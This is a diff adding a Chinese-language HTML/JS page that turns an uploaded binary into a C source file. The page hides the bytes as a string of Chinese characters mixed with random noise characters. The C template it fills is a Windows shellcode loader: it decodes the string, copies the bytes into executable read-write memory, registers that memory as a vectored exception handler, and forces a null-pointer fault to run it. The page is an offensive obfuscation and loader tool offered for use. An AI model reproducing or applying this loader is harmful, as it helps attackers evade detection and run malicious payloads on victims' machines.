@@ -1,0 +1,469 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <title>Python obf → C 生成器 (纯 HTML/JS)</title>
+  <style>
+    :root {
+      --bg: #0c0f14;
+      --panel: #0f131c;
+      --grid: rgba(255,255,255,0.04);
+      --accent: #10b981; /* 绿色点缀，避免蓝紫 */
+      --text: #e5e7eb;
+      --muted: #9ca3af;
+      --border: #1b2534;
+      --radius: 14px;
+      --mono: "Fira Code", "Cascadia Code", "SFMono-Regular", Consolas, monospace;
+      --sans: "Inter", "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 26px;
+      color: var(--text);
+      font-family: var(--sans);
+      min-height: 100vh;
+      background:
+        linear-gradient(0deg, transparent 24%, var(--grid) 25%, var(--grid) 26%, transparent 27%, transparent 74%, var(--grid) 75%, var(--grid) 76%, transparent 77%),
+        linear-gradient(90deg, transparent 24%, var(--grid) 25%, var(--grid) 26%, transparent 27%, transparent 74%, var(--grid) 75%, var(--grid) 76%, transparent 77%),
+        radial-gradient(circle at 20% 20%, rgba(16,185,129,0.12), transparent 30%),
+        radial-gradient(circle at 80% 0%, rgba(255,255,255,0.06), transparent 35%),
+        var(--bg);
+      background-size: 32px 32px, 32px 32px, auto, auto, auto;
+    }
+    h1 { margin: 0 0 10px; font-weight: 800; letter-spacing: 0.2px; }
+    p { margin: 0 0 18px; color: var(--muted); max-width: 720px; }
+    .panel {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 18px;
+      box-shadow: 0 16px 50px rgba(0,0,0,0.45);
+    }
+    label { display: block; margin-bottom: 8px; font-size: 13px; color: var(--muted); }
+    textarea {
+      width: 100%;
+      min-height: 360px;
+      resize: vertical;
+      padding: 12px;
+      background: #0a0d13;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      color: var(--text);
+      font-family: var(--mono);
+      font-size: 13px;
+      line-height: 1.45;
+      white-space: pre;
+      overflow: auto;
+    }
+    .actions { display: flex; gap: 10px; flex-wrap: wrap; margin: 10px 0; }
+    button {
+      padding: 10px 16px;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      color: var(--text);
+      font-weight: 700;
+      cursor: pointer;
+      background: linear-gradient(145deg, #0c121b, #0f1824);
+      transition: transform 120ms ease, box-shadow 120ms ease, border-color 120ms ease;
+    }
+    button.primary {
+      border-color: #145f46;
+      background: linear-gradient(145deg, #0f1f17, #123025);
+      color: #d1fae5;
+    }
+    button:hover { transform: translateY(-1px); box-shadow: 0 12px 30px rgba(0,0,0,0.35); border-color: #1f2937; }
+    button:active { transform: translateY(0); }
+    .pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 12px;
+      border-radius: 999px;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid var(--border);
+      color: var(--muted);
+      font-size: 13px;
+    }
+    .dropzone {
+      border: 1px dashed #1f2937;
+      border-radius: 14px;
+      padding: 26px;
+      background: rgba(255,255,255,0.03);
+      display: flex;
+      gap: 14px;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      transition: border-color 150ms ease, background 150ms ease;
+    }
+    .dropzone:hover { border-color: #145f46; }
+    .dropzone.dragover {
+      border-color: var(--accent);
+      background: rgba(16,185,129,0.06);
+    }
+    .dz-text { color: var(--muted); font-size: 14px; }
+    .dz-cta { color: var(--text); font-weight: 700; }
+  </style>
+</head>
+<body>
+  <h1>Python obf → C 生成器 (HTML/JS)</h1>
+  <p>拖拽二进制文件到下方区域，离线生成包含花壳中文编码的 C 源码（逻辑同原 Python）。</p>
+
+  <div class="panel">
+    <div class="dropzone" id="dropzone">
+      <div>
+        <div class="dz-cta">拖拽文件到这里</div>
+        <div class="dz-text">或点击选择文件。已加载字节会自动更新。</div>
+        <input type="file" id="fileInput" style="display:none" />
+      </div>
+      <button id="pickBtn" type="button" class="primary">选择文件</button>
+      <div class="pill">噪声组长度: <strong>2</strong></div>
+      <div class="pill">映射表: 0-9 A-F → 中文</div>
+    </div>
+
+    <div class="actions">
+      <button id="generateBtn" type="button" class="primary">生成 C 代码</button>
+      <button id="downloadBtn" type="button">下载 .c 文件</button>
+      <button id="copyBtn" type="button">复制到剪贴板</button>
+      <div id="status" class="pill" style="display:none;"></div>
+    </div>
+
+    <label for="output">生成的 C 代码</label>
+    <textarea id="output" spellcheck="false" placeholder="生成结果会显示在这里…"></textarea>
+  </div>
+
+  <script>
+    // 数据与模板
+    const HEX_TO_CN = {
+      '0': '零', '1': '一', '2': '二', '3': '三', '4': '四',
+      '5': '五', '6': '六', '7': '七', '8': '八', '9': '九',
+      'A': '啊', 'B': '波', 'C': '次', 'D': '的', 'E': '鹅', 'F': '佛'
+    };
+    const NOISE_CHARS = "春夏秋冬山水云风花月日夜心情人事梦思雨雪星远路灯江海城楼烟波清浅";
+    const GROUP_NOISE_LEN = 2;
+    const C_TEMPLATE = `#include <windows.h>
+#include <string.h>
+
+static int utf8_char_len(unsigned char c) {
+    if ((c & 0x80) == 0x00) {
+        return 1;
+    } else if ((c & 0xE0) == 0xC0) {
+        return 2;
+    } else if ((c & 0xF0) == 0xE0) {
+        return 3;
+    } else if ((c & 0xF8) == 0xF0) {
+        return 4;
+    }
+    return 1;
+}
+
+typedef struct {
+    const char *cn;
+    char hex;
+} HexMapEntry;
+
+static const HexMapEntry HEX_MAP[] = {
+    { "零", '0' },
+    { "一", '1' },
+    { "二", '2' },
+    { "三", '3' },
+    { "四", '4' },
+    { "五", '5' },
+    { "六", '6' },
+    { "七", '7' },
+    { "八", '8' },
+    { "九", '9' },
+    { "啊", 'A' },
+    { "波", 'B' },
+    { "次", 'C' },
+    { "的", 'D' },
+    { "鹅", 'E' },
+    { "佛", 'F' },
+};
+
+static char chinese_to_hex(const unsigned char *ch, int len) {
+    size_t i;
+    for (i = 0; i < sizeof(HEX_MAP)/sizeof(HEX_MAP[0]); ++i) {
+        const char *cn = HEX_MAP[i].cn;
+        if ((int)strlen(cn) == len && memcmp(cn, ch, len) == 0) {
+            return HEX_MAP[i].hex;
+        }
+    }
+    return '?';
+}
+
+int decode_flower_to_hex(const char *flower, char *out, size_t out_size) {
+    const int group_noise_len = {group_noise_len};
+    const unsigned char *p = (const unsigned char*)flower;
+
+    unsigned char core[1024];
+    size_t core_len = 0;
+
+    while (*p) {
+        int i;
+        for (i = 0; i < group_noise_len; ++i) {
+            if (!*p) break;
+            int len = utf8_char_len(*p);
+            p += len;
+        }
+        if (!*p) break;
+
+        int len = utf8_char_len(*p);
+        if (core_len + len + 1 >= sizeof(core)) {
+            break;
+        }
+        memcpy(core + core_len, p, len);
+        core_len += len;
+        p += len;
+    }
+    core[core_len] = '\\0';
+
+    char hex_buf[512];
+    size_t hex_len = 0;
+    const unsigned char *q = core;
+
+    while (*q) {
+        int len = utf8_char_len(*q);
+        char h = chinese_to_hex(q, len);
+        if (h == '?') {
+            return -1;
+        }
+        if (hex_len + 1 >= sizeof(hex_buf)) {
+            return -1;
+        }
+        hex_buf[hex_len++] = h;
+        q += len;
+    }
+    hex_buf[hex_len] = '\\0';
+
+    size_t out_pos = 0;
+    size_t i;
+    for (i = 0; i + 1 < hex_len && out_pos + 3 < out_size; i += 2) {
+        out[out_pos++] = hex_buf[i];
+        out[out_pos++] = hex_buf[i + 1];
+        if (i + 2 < hex_len && out_pos + 1 < out_size) {
+            out[out_pos++] = ' ';
+        }
+    }
+    out[out_pos] = '\\0';
+
+    return 0;
+}
+
+static int hex_char_val(char c) {
+    if (c >= '0' && c <= '9') return c - '0';
+    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
+    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
+    return -1;
+}
+
+static int hexstr_to_bytes(const char *hex, unsigned char *out, size_t out_cap) {
+    size_t i = 0;
+    size_t w = 0;
+    while (hex[i] && hex[i + 1]) {
+        if (hex[i] == ' ') { i++; continue; }
+        if (w >= out_cap) return -1;
+        int hi = hex_char_val(hex[i]);
+        int lo = hex_char_val(hex[i + 1]);
+        if (hi < 0 || lo < 0) return -1;
+        out[w++] = (unsigned char)((hi << 4) | lo);
+        i += 2;
+        if (hex[i] == ' ') i++;
+    }
+    return (int)w;
+}
+
+typedef PVOID (WINAPI *PFN_VirtualAlloc2)(HANDLE, PVOID, SIZE_T, ULONG, ULONG, void*, ULONG);
+typedef PVOID (WINAPI *PFN_AddVectoredExceptionHandler)(ULONG, PVECTORED_EXCEPTION_HANDLER);
+
+static unsigned char *g_sc = NULL;
+static int g_sc_len = 0;
+
+int main(void) {
+    const char *obfuscated = "{obfuscated}";
+    char hex_out[512];
+    unsigned char shellcode[256];
+
+    if (decode_flower_to_hex(obfuscated, hex_out, sizeof(hex_out)) != 0) {
+        return 1;
+    }
+    int sc_len = hexstr_to_bytes(hex_out, shellcode, sizeof(shellcode));
+    if (sc_len <= 0) {
+        return 1;
+    }
+
+    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
+    PFN_VirtualAlloc2 pVirtualAlloc2 = NULL;
+    if (hKernel) {
+        pVirtualAlloc2 = (PFN_VirtualAlloc2)GetProcAddress(hKernel, "VirtualAlloc2");
+    }
+
+    PFN_AddVectoredExceptionHandler pAddVectoredExceptionHandler = NULL;
+    if (hKernel) {
+        pAddVectoredExceptionHandler = (PFN_AddVectoredExceptionHandler)GetProcAddress(hKernel, "AddVectoredExceptionHandler");
+    }
+    if (!pAddVectoredExceptionHandler) {
+        return 1;
+    }
+
+    void *memory = NULL;
+    if (pVirtualAlloc2) {
+        memory = pVirtualAlloc2(GetCurrentProcess(), NULL, (SIZE_T)sc_len,
+                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
+                                NULL, 0);
+    } else {
+        memory = VirtualAlloc(NULL, (SIZE_T)sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    }
+    if (!memory) {
+        return 1;
+    }
+
+    memcpy(memory, shellcode, (size_t)sc_len);
+    g_sc = (unsigned char*)memory;
+    g_sc_len = sc_len;
+
+    PVOID handler = pAddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)g_sc);
+    if (!handler) {
+        return 1;
+    }
+
+    volatile int *p = (int*)0;
+    *p = 1;
+
+    return 0;
+}
+`;
+
+    // 工具函数
+    const hexSet = new Set(Object.keys(HEX_TO_CN));
+
+    function setStatus(text, tone = "muted") {
+      const s = document.getElementById("status");
+      s.textContent = text;
+      s.style.display = text ? "inline-flex" : "none";
+      s.style.color = tone === "error" ? "#fca5a5" : tone === "ok" ? "#34d399" : "var(--muted)";
+    }
+
+    function normalizeHex(input) {
+      let s = input.replace(/[\s\r\n\t]/g, "");
+      if (s.toLowerCase().startsWith("0x")) s = s.slice(2);
+      if (!s) throw new Error("十六进制字符串为空");
+      s = s.toUpperCase();
+      for (const ch of s) {
+        if (!hexSet.has(ch)) throw new Error(`非法十六进制字符: ${ch}`);
+      }
+      if (s.length % 2 !== 0) throw new Error("十六进制长度必须为偶数（两个字符代表一个字节）");
+      return s;
+    }
+
+    function hexToCore(hex) {
+      return hex.split("").map(ch => HEX_TO_CN[ch]).join("");
+    }
+
+    function coreToFlower(core) {
+      let out = "";
+      for (const ch of core) {
+        for (let i = 0; i < GROUP_NOISE_LEN; i++) {
+          out += NOISE_CHARS[Math.floor(Math.random() * NOISE_CHARS.length)];
+        }
+        out += ch;
+      }
+      return out;
+    }
+
+    function prettyHexWithSpaces(hex) {
+      return hex.match(/.{1,2}/g).join(" ");
+    }
+
+    function generateCCode(hexInput) {
+      const normalized = normalizeHex(hexInput);
+      const core = hexToCore(normalized);
+      const flower = coreToFlower(core);
+      const pretty = prettyHexWithSpaces(normalized);
+      return C_TEMPLATE
+        .replace("{group_noise_len}", GROUP_NOISE_LEN.toString())
+        .replace("{obfuscated}", flower)
+        .replace("{pretty_hex}", pretty);
+    }
+
+    // 事件绑定
+    let fileBuffer = null;
+    const fileInput = document.getElementById("fileInput");
+    const dropzone = document.getElementById("dropzone");
+    const output = document.getElementById("output");
+
+    document.getElementById("pickBtn").addEventListener("click", () => fileInput.click());
+
+    function handleFile(file) {
+      const reader = new FileReader();
+      reader.onload = () => {
+        fileBuffer = new Uint8Array(reader.result);
+        setStatus(`已读取 ${fileBuffer.length} 字节 (${file.name})`, "ok");
+      };
+      reader.onerror = () => setStatus("读取失败", "error");
+      reader.readAsArrayBuffer(file);
+    }
+
+    fileInput.addEventListener("change", (e) => {
+      const file = e.target.files[0];
+      if (file) handleFile(file);
+    });
+
+    dropzone.addEventListener("dragover", (e) => {
+      e.preventDefault();
+      dropzone.classList.add("dragover");
+    });
+    dropzone.addEventListener("dragleave", () => dropzone.classList.remove("dragover"));
+    dropzone.addEventListener("drop", (e) => {
+      e.preventDefault();
+      dropzone.classList.remove("dragover");
+      const file = e.dataTransfer.files[0];
+      if (file) handleFile(file);
+    });
+
+    document.getElementById("generateBtn").addEventListener("click", () => {
+      try {
+        if (!fileBuffer || fileBuffer.length === 0) {
+          throw new Error("请先选择非空的二进制文件");
+        }
+        let hex = "";
+        for (let i = 0; i < fileBuffer.length; i++) {
+          const v = fileBuffer[i].toString(16).toUpperCase().padStart(2, "0");
+          hex += v;
+        }
+        const code = generateCCode(hex);
+        output.value = code;
+        setStatus("生成完成", "ok");
+      } catch (err) {
+        setStatus(err.message || "生成失败", "error");
+      }
+    });
+
+    document.getElementById("copyBtn").addEventListener("click", async () => {
+      if (!output.value) return;
+      try {
+        await navigator.clipboard.writeText(output.value);
+        setStatus("已复制到剪贴板", "ok");
+      } catch {
+        setStatus("复制失败，可能被浏览器拦截", "error");
+      }
+    });
+
+    document.getElementById("downloadBtn").addEventListener("click", () => {
+      if (!output.value) {
+        setStatus("请先生成代码再下载", "error");
+        return;
+      }
+      const blob = new Blob([output.value], { type: "text/x-c" });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = "out.c";
+      a.click();
+      URL.revokeObjectURL(url);
+      setStatus("已触发下载 out.c", "ok");
+    });
+  </script>
+</body>
+</html>
